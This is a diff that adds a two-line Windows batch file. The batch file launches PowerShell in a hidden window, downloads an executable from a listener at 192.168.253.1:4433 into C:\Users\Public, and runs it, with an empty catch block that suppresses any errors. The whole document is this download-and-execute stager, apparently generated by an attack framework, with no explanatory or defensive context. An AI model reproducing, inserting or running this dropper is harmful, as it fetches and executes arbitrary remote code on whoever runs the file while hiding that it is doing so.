@@ -1,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -Command "try{(New-Object Net.WebClient).DownloadFile('http://192.168.253.1:4433/?h=192.168.253.1&p=4433&t=tcp&a=w64&stage=true','C:\Users\Public\f528764dtcp.exe');Start-Process 'C:\Users\Public\f528764dtcp.exe'}catch{}"
